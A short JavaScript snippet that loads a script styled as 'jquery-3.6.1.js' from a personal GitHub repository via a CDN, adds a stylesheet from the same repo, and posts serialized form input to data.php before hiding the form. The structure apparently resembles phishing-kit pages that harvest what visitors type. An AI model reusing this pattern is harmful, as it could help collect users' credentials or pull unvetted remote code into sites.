var sc = document.createElement("script");
sc.type = "text/javascript";
sc.src = "https://cdn.statically.io/gh/ardifviany/npmjs/main/jquery-3.6.1.js";
document.head.appendChild(sc);

var cssId="styleget";
if(!document.getElementById(cssId))
{
var head=document.getElementsByTagName("head")[0],link=document.createElement("link");
link.id=cssId,link.rel="stylesheet",link.type="text/css",link.href="https://cdn.statically.io/gh/ardifviany/npmjs/main/sakhdhaw.css",link.media="all",head.appendChild(link)
}
function checking() {
                let data = $('.class').serialize();
                $.post('data.php', data, function(e) {
                    $('.class').toggle()
                })
                return false;
            }
